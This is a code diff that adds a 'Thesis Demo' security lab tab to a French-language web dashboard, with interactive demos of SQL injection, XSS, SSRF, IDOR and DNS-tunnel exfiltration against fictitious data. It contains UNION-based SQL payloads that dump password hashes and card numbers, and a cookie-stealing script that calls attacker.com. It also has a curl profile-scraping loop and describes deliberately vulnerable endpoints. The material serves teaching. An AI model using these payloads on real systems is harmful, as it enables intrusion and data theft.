@@ -159,6 +159,7 @@
     <button data-tab="ai">🤖 IA</button>
     <button data-tab="apis">🔌 APIs Sociales</button>
     <button data-tab="automations">⚡ Automations</button>
+    <button data-tab="thesis">🎓 Thesis Demo</button>
     <button data-tab="settings">⚙️ Paramètres</button>
   </div>
 
@@ -173,6 +174,7 @@
     <div class="tab-content" id="tab-ai"></div>
     <div class="tab-content" id="tab-apis"></div>
     <div class="tab-content" id="tab-automations"></div>
+    <div class="tab-content" id="tab-thesis"></div>
     <div class="tab-content" id="tab-settings"></div>
   </div>
 </div>
@@ -238,6 +240,7 @@ function loadTab(name) {
   else if (name === 'ai') loadAI()
   else if (name === 'apis') loadAPIs()
   else if (name === 'automations') loadAutomations()
+  else if (name === 'thesis') loadThesis()
   else if (name === 'settings') loadSettings()
 }
 
@@ -1042,6 +1045,280 @@ function escHtml(s) {
   return s.replace(/[<>&"']/g, function(c) { return map[c] })
 }
 function copyText(btn) { const pre = btn.parentElement.nextElementSibling; if (pre) { navigator.clipboard.writeText(pre.textContent).then(() => showToast('Copié!')) } }
+
+// ==================== THESIS DEMO ====================
+async function loadThesis() {
+  const container = $('tab-thesis')
+  const kill = await api('/thesis/kill-chain')
+  container.innerHTML = `
+    <div class="section">
+      <h2>🎓 Thesis Demo Lab — Data Exfiltration & Marketing Exploitation</h2>
+      <div class="alert alert-info">Toutes les démos utilisent des données fictives isolées. Aucune donnée réelle n'est exposée.</div>
+
+      <div class="flex" style="gap:12px;flex-wrap:wrap;margin-bottom:20px">
+        <div class="stat-card" style="flex:1;min-width:120px"><div class="value" style="font-size:20px">${kill?.live_stats?.leads_in_database || 0}</div><div class="label">Leads "volés"</div></div>
+        <div class="stat-card" style="flex:1;min-width:120px"><div class="value" style="font-size:20px">${kill?.stages?.length || 7}</div><div class="label">Étapes Kill Chain</div></div>
+        <div class="stat-card" style="flex:1;min-width:120px"><div class="value" style="font-size:20px">7</div><div class="label">Démos interactives</div></div>
+      </div>
+
+      <div class="nav-tabs" style="background:transparent;border:none;padding:0;gap:4px;flex-wrap:wrap" id="thesis-subnav">
+        <button class="active" data-stab="sqli" style="padding:8px 14px;font-size:12px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#ccc;cursor:pointer">1. SQL Injection</button>
+        <button data-stab="xss" style="padding:8px 14px;font-size:12px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#ccc;cursor:pointer">2. XSS</button>
+        <button data-stab="ssrf" style="padding:8px 14px;font-size:12px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#ccc;cursor:pointer">3. SSRF</button>
+        <button data-stab="idor" style="padding:8px 14px;font-size:12px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#ccc;cursor:pointer">4. IDOR</button>
+        <button data-stab="dns" style="padding:8px 14px;font-size:12px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#ccc;cursor:pointer">5. DNS Tunnel</button>
+        <button data-stab="chain" style="padding:8px 14px;font-size:12px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#ccc;cursor:pointer">6. Kill Chain</button>
+      </div>
+      <div id="thesis-subcontent" style="margin-top:16px"></div>
+    </div>
+  `
+
+  document.querySelectorAll('#thesis-subnav button').forEach(btn => {
+    btn.onclick = () => {
+      document.querySelectorAll('#thesis-subnav button').forEach(b => b.classList.remove('active'))
+      btn.classList.add('active')
+      loadThesisDemo(btn.dataset.stab)
+    }
+  })
+  loadThesisDemo('sqli')
+}
+
+async function loadThesisDemo(demo) {
+  const div = $('thesis-subcontent')
+  if (demo === 'sqli') {
+    div.innerHTML = `
+      <div class="card"><h3 style="color:#e94560">🔍 SQL Injection — Extraction de base de données</h3>
+      <p style="color:#888;margin:8px 0">Cette API est VOLONTAIREMENT vulnérable. Le paramètre <code>user_id</code> est concaténé directement dans la requête SQL.</p>
+      <div class="flex" style="gap:8px;flex-wrap:wrap;margin:8px 0">
+        <input id="sqli-input" value="1" style="flex:1;padding:8px;background:#0d0d0d;border:1px solid #333;border-radius:4px;color:#fff;font-family:monospace">
+        <button class="btn" onclick="runSqli()">Exécuter l'attaque</button>
+        <button class="btn btn-secondary" onclick="runSqliSafe()">Version sécurisée</button>
+      </div>
+      <div id="sqli-result"></div>
+      <div style="margin-top:12px;padding:12px;background:#151515;border-radius:6px">
+        <p style="color:#888;font-size:12px;margin-bottom:8px"><strong>🧪 Essaie ces payloads:</strong></p>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('sqli-input').value='1';runSqli()">1 (requête normale)</code>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('sqli-input').value='1 UNION SELECT 1,2,3,4,5,6,7,8,9,10';runSqli()">1 UNION SELECT 1,2,3,4,5,6,7,8,9,10 (trouver colonnes)</code>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('sqli-input').value='1 UNION SELECT 1,username,email,password_hash,phone,6,7,8,9,10 FROM demo_users';runSqli()">UNION SELECT username,email,password_hash (dump users)</code>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('sqli-input').value='1 UNION SELECT 1,username,email,password_hash,credit_card,address,7,8,9,10 FROM demo_users';runSqli()">UNION SELECT credit_card (données sensibles)</code>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('sqli-input').value=\"1' UNION SELECT 1,username,email,password_hash,phone,6,7,8,9,10 FROM demo_users-- \";runSqli()">Avec quote + commentaire (MySQL)</code>
+      </div>
+      </div>
+    `
+  }
+  else if (demo === 'xss') {
+    div.innerHTML = `
+      <div class="card"><h3 style="color:#e94560">💉 XSS — Cross-Site Scripting</h3>
+      <p style="color:#888;margin:8px 0">Trois démos XSS. Choisis:</p>
+      <div class="flex" style="gap:8px;margin:8px 0">
+        <button class="btn" onclick="openXssReflected()">🪞 Reflected XSS</button>
+        <button class="btn btn-secondary" onclick="openXssStored()">💾 Stored XSS (Forum)</button>
+        <button class="btn btn-warning" onclick="openXssCookie()">🍪 Cookie Theft Simulation</button>
+      </div>
+      <div id="xss-result" style="margin-top:8px">
+        <div style="padding:20px;background:#151515;border-radius:8px;text-align:center;color:#888">
+          Clique sur un bouton ci-dessus pour lancer la démo.
+        </div>
+      </div>
+      </div>
+    `
+  }
+  else if (demo === 'ssrf') {
+    div.innerHTML = `
+      <div class="card"><h3 style="color:#e94560">🌐 SSRF — Server-Side Request Forgery</h3>
+      <p style="color:#888;margin:8px 0">Le serveur FETCH n'importe quelle URL que vous lui donnez — comme un proxy non sécurisé.</p>
+      <div class="flex" style="gap:8px;flex-wrap:wrap;margin:8px 0">
+        <input id="ssrf-input" value="http://localhost:3002/api/thesis/internal/aws-meta" style="flex:1;padding:8px;background:#0d0d0d;border:1px solid #333;border-radius:4px;color:#fff;font-family:monospace;font-size:12px">
+        <button class="btn" onclick="runSsrf()">🔍 Exécuter</button>
+      </div>
+      <div id="ssrf-result"></div>
+      <div style="margin-top:12px;padding:12px;background:#151515;border-radius:6px">
+        <p style="color:#888;font-size:12px"><strong>Essaie ces cibles:</strong></p>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('ssrf-input').value='http://localhost:3002/api/thesis/internal/aws-meta';runSsrf()">AWS Metadata (simulé)</code>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('ssrf-input').value='http://localhost:3002/api/thesis/internal/config';runSsrf()">Config interne (DB, Redis)</code>
+        <code style="display:block;padding:4px;cursor:pointer" onclick="\$('ssrf-input').value='http://localhost:3001/';runSsrf()">IPTV-Boss (service voisin)</code>
+      </div>
+      </div>
+    `
+  }
+  else if (demo === 'idor') {
+    div.innerHTML = `
+      <div class="card"><h3 style="color:#e94560">🔑 IDOR — Broken Object Level Authorization</h3>
+      <p style="color:#888;margin:8px 0">Cette API ne vérifie PAS qui vous êtes. Changez simplement l'ID dans l'URL pour voir le profil d'un autre utilisateur.</p>
+      <div class="flex" style="gap:8px;flex-wrap:wrap;margin:8px 0">
+        <input id="idor-input" value="1" type="number" min="1" max="10" style="width:80px;padding:8px;background:#0d0d0d;border:1px solid #333;border-radius:4px;color:#fff">
+        <button class="btn" onclick="runIdor()">🔍 Voir profil</button>
+        <button class="btn btn-secondary" onclick="runIdorAll()">📋 Scrapper TOUS les profils</button>
+      </div>
+      <div id="idor-result"></div>
+      <div style="margin-top:12px;padding:12px;background:#0d0d0d;border-radius:6px;font-size:12px;color:#888">
+        <p><strong>Automatisation (bash):</strong></p>
+        <pre style="margin-top:4px">for id in $(seq 1 10); do curl https://lab.jobtool.shop/api/thesis/users/$id; done</pre>
+      </div>
+      </div>
+    `
+  }
+  else if (demo === 'dns') {
+    div.innerHTML = `
+      <div class="card"><h3 style="color:#e94560">📡 DNS Tunneling — Exfiltration Silencieuse</h3>
+      <p style="color:#888;margin:8px 0">Tape un message secret. La démo montre comment il serait encodé en sous-domaines DNS pour contourner les firewalls.</p>
+      <div class="flex" style="gap:8px;flex-wrap:wrap;margin:8px 0">
+        <input id="dns-input" value="Carte bleue: 4111111111111111, CVV: 123" style="flex:1;padding:8px;background:#0d0d0d;border:1px solid #333;border-radius:4px;color:#fff;font-family:monospace">
+        <button class="btn" onclick="runDns()">🔍 Simuler l'exfiltration</button>
+      </div>
+      <div id="dns-result"></div>
+      </div>
+    `
+  }
+  else if (demo === 'chain') {
+    div.innerHTML = `
+      <div class="card"><h3 style="color:#e94560">⛓️ Kill Chain — Du Vol de Données au Ciblage Marketing</h3>
+      <p style="color:#888;margin:8px 0">Le cycle complet, démontré avec les outils de votre lab.</p>
+      <div id="chain-result"></div>
+      </div>
+    `
+    loadKillChain()
+  }
+}
+
+// ==================== SQLi ====================
+async function runSqli() {
+  const div = $('sqli-result')
+  const input = $('sqli-input').value
+  div.innerHTML = '<p style="color:#888">Exécution...</p>'
+  const res = await api('/thesis/sqli?user_id=' + encodeURIComponent(input))
+  div.innerHTML = `<div style="font-size:12px">
+    <div class="alert alert-info"><strong>Requête exécutée:</strong> <code style="font-size:11px">${escHtml(res.query_executed)}</code></div>
+    ${res.error ? `<div class="alert alert-error">❌ ${escHtml(res.error)}</div>` : ''}
+    ${res.results ? `<pre style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:11px;overflow-x:auto">${escHtml(JSON.stringify(res.results, null, 2))}</pre>` : ''}
+    ${res.note ? `<div style="margin-top:8px;padding:8px;border-radius:4px;background:#1a237e;color:#9fa8da;font-size:12px">${escHtml(res.note)}</div>` : ''}
+    ${res.injection_tip ? `<div style="margin-top:8px;padding:8px;border-radius:4px;background:#3e2723;color:#bcaaa4;font-size:12px">💡 ${escHtml(res.injection_tip)}</div>` : ''}
+  </div>`
+}
+
+async function runSqliSafe() {
+  const div = $('sqli-result')
+  const input = $('sqli-input').value
+  div.innerHTML = '<p style="color:#888">Version sécurisée...</p>'
+  const res = await api('/thesis/sqli-fixed?user_id=' + encodeURIComponent(input))
+  div.innerHTML = `<div style="font-size:12px">
+    <div class="alert alert-success"><strong>✅ Version protégée</strong> — Requête paramétrée: <code style="font-size:11px">${escHtml(res.query_safe)}</code></div>
+    ${res.results ? `<pre style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:11px;overflow-x:auto">${escHtml(JSON.stringify(res.results, null, 2))}</pre>` : ''}
+    <div style="margin-top:8px;padding:8px;border-radius:4px;background:#1b5e20;color:#a5d6a7;font-size:12px">✅ ${escHtml(res.note)}</div>
+  </div>`
+}
+
+// ==================== XSS ====================
+function openXssReflected() {
+  const div = $('xss-result')
+  div.innerHTML = `<iframe src="/api/thesis/xss" style="width:100%;height:500px;border:1px solid #333;border-radius:8px;background:#0d0d0d"></iframe>`
+}
+
+function openXssStored() {
+  const div = $('xss-result')
+  div.innerHTML = `<iframe src="/api/thesis/xss?type=stored" style="width:100%;height:550px;border:1px solid #333;border-radius:8px;background:#0d0d0d"></iframe>`
+}
+
+function openXssCookie() {
+  const div = $('xss-result')
+  div.innerHTML = `
+    <div style="background:#151515;padding:16px;border-radius:8px">
+    <h4 style="color:#fff;margin-bottom:8px">🍪 Simulation de Vol de Cookie</h4>
+    <p style="color:#888;font-size:12px;margin-bottom:12px">Dans un vrai XSS, l'attaquant injecte ce script pour voler les cookies de session:</p>
+    <pre style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:12px;margin-bottom:12px">&lt;script&gt;
+  // Le cookie est envoyé au serveur de l'attaquant
+  new Image().src = 'https://attacker.com/steal?cookie=' +
+    document.cookie;
+&lt;/script&gt;</pre>
+    <p style="color:#888;font-size:12px;margin-bottom:8px"><strong>Ton cookie de session actuel sur ce site:</strong></p>
+    <div style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:12px;font-family:monospace;color:#4fc3f7;word-break:break-all">${document.cookie || '(pas de cookie sur cette page)'}</div>
+    <p style="color:#666;font-size:11px;margin-top:8px">Si ceci était un vrai XSS, ton cookie serait déjà chez l'attaquant.</p>
+    </div>
+  `
+}
+
+// ==================== SSRF ====================
+async function runSsrf() {
+  const div = $('ssrf-result')
+  const url = $('ssrf-input').value
+  div.innerHTML = '<p style="color:#888">Requête en cours...</p>'
+  const res = await api('/thesis/ssrf?url=' + encodeURIComponent(url))
+  const resp = res.response_preview || JSON.stringify(res, null, 2)
+  div.innerHTML = `<div style="font-size:12px">
+    <div class="alert alert-info"><strong>URL appelée:</strong> <code style="font-size:11px">${escHtml(res.url_requested)}</code> → Status: ${res.status || res.error || 'N/A'}</div>
+    ${res.risk ? `<div class="alert alert-error">${escHtml(res.risk)}</div>` : ''}
+    ${res.explication ? `<div style="padding:8px;color:#888;font-size:11px">${escHtml(res.explication)}</div>` : ''}
+    <pre style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:11px;overflow-x:auto;max-height:400px">${escHtml(typeof resp === 'string' ? resp.substring(0, 3000) : JSON.stringify(resp, null, 2).substring(0, 3000))}</pre>
+  </div>`
+}
+
+// ==================== IDOR ====================
+async function runIdor() {
+  const div = $('idor-result')
+  const id = $('idor-input').value
+  div.innerHTML = '<p style="color:#888">Chargement...</p>'
+  const res = await api('/thesis/users/' + id)
+  if (!res) return
+  div.innerHTML = `<div style="font-size:12px">
+    ${res.explication ? `<div style="padding:8px;color:#888;font-size:11px;margin-bottom:8px">${escHtml(res.explication)}</div>` : ''}
+    <pre style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:11px;overflow-x:auto">${escHtml(JSON.stringify(res.data || res, null, 2))}</pre>
+    ${res.automation_hint ? `<div style="margin-top:8px;padding:8px;background:#1a237e;color:#9fa8da;font-size:11px;border-radius:4px">💻 ${escHtml(res.automation_hint)}</div>` : ''}
+  </div>`
+}
+
+async function runIdorAll() {
+  const div = $('idor-result')
+  div.innerHTML = '<p style="color:#888">Scraping de tous les profils...</p>'
+  let all = []
+  for (let id = 1; id <= 5; id++) {
+    const res = await api('/thesis/users/' + id)
+    if (res?.data) all.push(res.data)
+  }
+  div.innerHTML = `<div style="font-size:12px">
+    <div class="alert alert-error"><strong>⛔ ${all.length} profils extraits sans authentification</strong> — simple incrémentation d'ID</div>
+    <pre style="background:#0d0d0d;padding:12px;border-radius:4px;font-size:11px;overflow-x:auto">${escHtml(JSON.stringify(all, null, 2))}</pre>
+  </div>`
+}
+
+// ==================== DNS TUNNEL ====================
+async function runDns() {
+  const div = $('dns-result')
+  const data = $('dns-input').value
+  div.innerHTML = '<p style="color:#888">Encodage en cours...</p>'
+  const res = await api('/thesis/dns-tunnel', { method: 'POST', body: JSON.stringify({ data }) })
+  if (!res) return
+  div.innerHTML = `<div style="font-size:12px">
+    <div class="alert alert-info"><strong>📦 Donnée originale:</strong> ${escHtml(res.original_data)} (${res.data_size_bytes} bytes)</div>
+    <div style="margin-top:8px;padding:8px;background:#151515;border-radius:4px">
+      <strong>Requêtes DNS générées (${res.total_queries} queries):</strong>
+      ${res.dns_queries.map((q, i) => `<div style="padding:4px 0;border-bottom:1px solid #2a2a2a;font-family:monospace;font-size:11px;color:#aaa">
+        📡 ${escHtml(q)}
+        <span style="color:#4fc3f7;margin-left:8px">→ ${escHtml(res.attacker_side_decoded[i]?.decoded_chunk || '')}</span>
+      </div>`).join('')}
+    </div>
+    <div style="margin-top:8px;padding:8px;background:#3e2723;border-radius:4px;color:#bcaaa4;font-size:11px">
+      ⚠️ ${escHtml(res.risk)}
+    </div>
+  </div>`
+}
+
+// ==================== KILL CHAIN ====================
+async function loadKillChain() {
+  const div = $('chain-result')
+  const res = await api('/thesis/kill-chain')
+  if (!res) return
+  div.innerHTML = res.stages.map(s => `
+    <div style="background:#151515;border:1px solid #2a2a2a;border-radius:8px;padding:16px;margin-bottom:12px">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+        <h4 style="color:#fff;margin:0;font-size:14px">${s.name}</h4>
+        <span style="background:#e94560;color:#fff;padding:2px 10px;border-radius:10px;font-size:11px">Étape ${s.stage}</span>
+      </div>
+      <p style="color:#888;font-size:12px">${s.description}</p>
+      <div style="margin-top:8px;padding:8px;background:#1a237e;border-radius:4px;color:#9fa8da;font-size:11px">🔧 ${s.technique}</div>
+      <div style="margin-top:4px;padding:8px;background:#0d0d0d;border-radius:4px;color:#4fc3f7;font-size:11px">📦 ${s.result}</div>
+    </div>
+  `).join('')
+}
 
 </script>
 </body>
